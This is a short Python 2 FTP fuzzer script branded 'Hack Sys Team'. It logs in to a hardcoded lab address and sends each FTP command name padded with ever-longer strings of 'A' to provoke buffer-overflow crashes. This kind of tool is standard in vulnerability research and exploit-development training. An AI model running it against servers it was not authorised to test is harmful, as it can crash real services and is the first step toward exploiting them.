#!/usr/bin/python
import sys, socket, time

#Variable Initialization
port = 21
buffer = []
counter = 200

#color variables
green  = "\033[32m" # green
white  = "\033[0m"  # white (normal)

#Logo
logo = ("""
                  _      __             _____                     
  /\  /\__ _  ___| | __ / _\_   _ ___  /__   \___  __ _ _ __ ___  
 / /_/ / _` |/ __| |/ / \ \| | | / __|   / /\/ _ \/ _` | '_ ` _ \ 
/ __  / (_| | (__|   <  _\ \ |_| \__ \  / / |  __/ (_| | | | | | |
\/ /_/ \__,_|\___|_|\_\ \__/\__, |___/  \/   \___|\__,_|_| |_| |_|
                           |___/                                 
""")

#Print the logo
print green + logo + white

#Ask for the target IP address
target = "192.168.96.131" #raw_input("Please enter target address: ")

#Create and store the junk buffer in an array
while len(buffer) <= 1000:
	buffer.append("A" * counter)
	counter = counter + 200

commands = ["APPEND","ASCII","BELL","BINARY","BYE","CD","CLOSE","DELETE","DEBUG","DIR","DISCONNECT","GET",
			"GLOB","HASH","HELP","LCD","LITERAL","LS","MDELETE","MDIR","MGET","MKDIR","MLS","MPUT","OPEN",
			"PROMPT","PUT","PWD","QUIT","QUOTE","RECV","REMOTEHELP","RENAME","RMDIR","SEND","STATUS","TRACE",
			"TYPE","USER","VERBOSE"]

#For every command in commands array
for command in commands:
	print "[+] Fuzzing " + command + " command:"
	#For every junk in buffer array
	for string in buffer:
		#Try block
		try:
			print "\tLength of buffer: " + str(len(string))
			#Create a socket
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			#Connect to the Web Server
			s.connect((target, port))
			#Receive 1024 bytes
			s.recv(1024)
			#Send Username
			s.send('USER ftp\r\n')
			#Receive 1024 bytes
			s.recv(1024)
			#Send Password
			s.send('PASS ftp\r\n')
			#Receive 1024 bytes
			s.recv(1024)
			#Send magic string
			s.send(command + ' ' + string + '\r\n')
			#Quit from the FTP server
			s.send('QUIT\r\n')
			s.close()
		
		#Exception block
		except KeyboardInterrupt:
			print "[-] CTRL+C received..\n"
			#Close the socket
			s.close()
			sys.exit(0)
		
		#Exception block
		except:
			print "[-] Target might be dead..\n"
			#Close the socket
			s.close()
			#Exit the program
			sys.exit(0)